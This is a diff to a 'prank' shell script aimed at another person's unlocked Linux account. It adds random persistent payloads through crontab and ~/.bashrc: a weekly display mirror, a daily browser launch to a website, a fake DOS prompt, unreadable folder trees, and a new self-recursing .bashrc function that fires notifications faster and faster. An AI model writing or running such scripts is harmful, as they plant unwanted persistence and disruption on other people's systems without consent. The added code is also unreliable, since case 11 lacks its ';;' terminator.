@@ -21,7 +21,7 @@ RANDOM=`date '+%s'`
 # Semi-permanent prank
 for n in {1 .. $[($RANDOM % 3) + 1]}
 do
-    case $[$RANDOM % 12] in
+    case $[$RANDOM % 13] in
         0) # Mirror the display weekly
             crontab -l | sed "\$a\@weekly /usr/bin/xrandr --output $DEVICE --reflect xy" | crontab -
             ;;
@@ -69,10 +69,14 @@ do
             crontab -l | sed "\$a\@daily nohup www-browser http://beepdog.us >> /dev/null &" | crontab -
             ;;
         10) # Emulate DOS-prompt
-            echo "export PS1='C:\${PWD//\//\\\\\\\\\\}> '" >> .bashrc
+            echo "export PS1='C:\${PWD//\//\\\\\\\\\\}> '" >> ~/.bashrc
             ;;
         11) # Create ~-folder
             mkdir -p -m 0400 ~/\~/{1..100}
+        12) # Give user a notification more and more often
+            if [ `command -v notify-send` ] ; then
+                echo ":(){ (sleep \$1 ; notify-send "Ulåst datamat er ulåst" ; : \$((\$1/2))) };: 600 &" >> ~/.bashrc
+            fi
     esac
 done
 
